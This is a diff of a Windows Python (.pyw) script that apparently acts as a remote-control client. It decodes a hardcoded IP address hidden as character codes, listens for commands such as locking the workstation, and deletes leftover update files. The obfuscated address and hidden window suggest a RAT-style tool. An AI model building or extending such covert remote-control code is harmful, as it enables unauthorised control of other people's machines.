@@ -12,6 +12,11 @@ except:
     import ctypes
 import win32api, win32con
 
+if os.path.isfile("old.pyw"):
+    os.remove("old.pyw")
+if os.path.isfile("new.pyw"):
+    os.remove("new.pyw")
+
 PI = [49, 48, 46, 48, 46, 48, 46, 49, 50, 54]
 IP = ''.join(map(chr, PI))
 PORT = 5050
@@ -25,7 +30,7 @@ def processCommand(cmd, args):
     if os.path.isfile("old.pyw"):
         os.remove("old.pyw")
     if os.path.isfile("new.pyw"):
-        os.remove("old.pyw")
+        os.remove("new.pyw")
     if cmd == "lock":
         subprocess.call("Rundll32.exe user32.dll,LockWorkStation", shell=False)
         return "!READY"
